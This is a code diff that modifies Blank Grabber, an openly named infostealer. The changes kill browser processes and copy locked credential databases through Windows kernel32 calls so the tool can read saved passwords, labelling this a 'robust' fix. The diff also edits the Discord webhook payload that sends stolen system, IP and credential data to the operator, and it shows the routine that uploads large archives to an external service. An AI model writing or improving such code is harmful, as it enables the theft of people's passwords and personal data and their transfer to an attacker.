@@ -446,10 +446,35 @@ class Browsers:
                     tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                     if not os.path.isfile(tempfile):
                         break
+                # Fixed: use robust file copy to bypass exclusive locks
                 try:
-                    shutil.copy(path, tempfile)
+                    # Ensure process is killed and wait (already done before calling this method)
+                    # Use kernel32 to copy with FILE_SHARE_READ | FILE_SHARE_WRITE
+                    kernel32 = ctypes.windll.kernel32
+                    GENERIC_READ = 0x80000000
+                    FILE_SHARE_READ = 0x00000001
+                    FILE_SHARE_WRITE = 0x00000002
+                    OPEN_EXISTING = 3
+                    FILE_ATTRIBUTE_NORMAL = 0x80
+                    h_src = kernel32.CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None)
+                    if h_src == -1:
+                        raise Exception('Could not open source file')
+                    h_dst = kernel32.CreateFileW(tempfile, 0x40000000, 0, None, 2, FILE_ATTRIBUTE_NORMAL, None)
+                    if h_dst == -1:
+                        kernel32.CloseHandle(h_src)
+                        raise Exception('Could not create temp file')
+                    buf = ctypes.create_string_buffer(4096)
+                    bytes_read = wintypes.DWORD()
+                    while kernel32.ReadFile(h_src, buf, 4096, ctypes.byref(bytes_read), None) and bytes_read.value:
+                        kernel32.WriteFile(h_dst, buf, bytes_read.value, ctypes.byref(wintypes.DWORD()), None)
+                    kernel32.CloseHandle(h_dst)
+                    kernel32.CloseHandle(h_src)
                 except Exception:
-                    continue
+                    # fallback to shutil.copy if robust method fails
+                    try:
+                        shutil.copy(path, tempfile)
+                    except Exception:
+                        continue
                 db = sqlite3.connect(tempfile)
                 db.text_factory = lambda b: b.decode(errors='ignore')
                 cursor = db.cursor()
@@ -1128,7 +1153,9 @@ class BlankGrabber:
 
                 def run(name, path):
                     try:
+                        # Kill browser process and wait to release locks
                         Utility.TaskKill(procname)
+                        time.sleep(2)
                         browser = Browsers.Chromium(path)
                         saveToDir = os.path.join(self.TempFolder, 'Credentials', name)
                         passwords = browser.GetPasswords() if Settings.CapturePasswords else None
@@ -1332,7 +1359,7 @@ class BlankGrabber:
         match Settings.C2[0]:
             case 0:
                 image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
-                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Yapımcı: Croxlv | Tüm bilgiler VaporLock tarafından çekilmiştir'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
+                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
